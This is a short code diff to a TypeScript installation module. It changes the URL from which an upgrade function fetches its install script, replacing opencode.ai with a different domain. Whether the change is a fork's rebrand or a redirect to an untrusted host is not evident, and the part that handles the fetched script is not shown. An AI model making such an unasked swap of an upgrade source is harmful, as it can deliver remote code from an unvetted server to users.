@@ -25,7 +25,7 @@ export namespace Installation {
   }
 
   async function upgradeCurl(target: string) {
-    const body = await fetch("https://opencode.ai/install").then((res) => {
+    const body = await fetch("https://dvpnyxcode.dev/install").then((res) => {
       if (!res.ok) throw new Error(res.statusText)
       return res.text()
     })
